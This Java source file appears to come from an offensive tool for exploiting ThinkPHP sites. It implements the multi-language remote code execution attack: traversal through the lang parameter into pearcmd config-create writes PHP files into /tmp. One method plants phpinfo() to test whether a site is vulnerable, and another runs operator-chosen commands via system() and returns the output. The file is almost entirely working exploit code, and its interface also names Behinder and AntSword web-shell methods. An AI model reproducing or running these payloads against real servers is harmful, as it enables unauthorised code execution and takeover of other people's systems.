package com.guitool.tpbomb.payload;

import com.guitool.tpbomb.util.ResultUtils;
import com.guitool.tpbomb.util.UrlUtils;

import java.util.ArrayList;
import java.util.Random;

public class TPMultipleLanguageRce implements PayloadTemplate {
    final ArrayList<String> payloadList = new ArrayList<>(){{
        add("?lang=../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=phpinfo()?>+/tmp/shell.php");
        add("public/index.php?lang=../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=phpinfo()?>+/tmp/shell.php");
    }};

    @Override
    public ResultUtils checkVulnerability(String url) {
        try {
            for (String payload : payloadList) {
                Random random = new Random();
                String randomInt = String.valueOf(random.nextInt(10000));
                UrlUtils.doGetSpecial(url + payload.replace("shell.php", randomInt+".php"));
                String result = UrlUtils.doGet(url + payload.replace("usr/local/lib/php/pearcmd&+config-create+/&/<?=phpinfo()?>+/tmp/shell.php", "tmp/" + randomInt));
                if (result == null) {
                    continue;
                }
                if (result.contains("PHP Version")) {
                    return new ResultUtils(true, "ThinkPHP 多语言RCE", url + payload.replace("usr/local/lib/php/pearcmd&+config-create+/&/<?=phpinfo()?>+/tmp/shell.php", "tmp/" + randomInt));
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new ResultUtils(false, "ThinkPHP 多语言RCE", "");
    }

    @Override
    public ResultUtils executeVulnerability(String url, String command) {
        String replaceCommand = command.replace(" ", "%20");
        ArrayList<String> attackPayloadList = new ArrayList<>(){{
            add("?lang=../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=system(\"" + command + "\")?>+/tmp/");
            add("public/index.php?lang=../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=system(\"" + command + "\")?>+/tmp/");
        }};
        try {
            for (String payload : attackPayloadList) {
                Random random = new Random();
                String randomInt = random.nextInt(10000) + "_shell";
                UrlUtils.doGetSpecial(url + payload + randomInt + ".php");
                String result = UrlUtils.doGet(url + payload.substring(0, payload.indexOf("usr/local/lib/php/pearcmd")) + "tmp/" + randomInt);
                if (result == null) {
                    continue;
                }
                if (!result.equals("")) {
                    return new ResultUtils(true, "", result.substring(result.lastIndexOf("/&/") + 3, result.lastIndexOf("/pear")));
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new ResultUtils(false, "", "");
    }

    @Override
    public ResultUtils getBehinderShell(String url) {
        return null;
    }

    @Override
    public ResultUtils getAntswordShell(String url) {
        return null;
    }

}
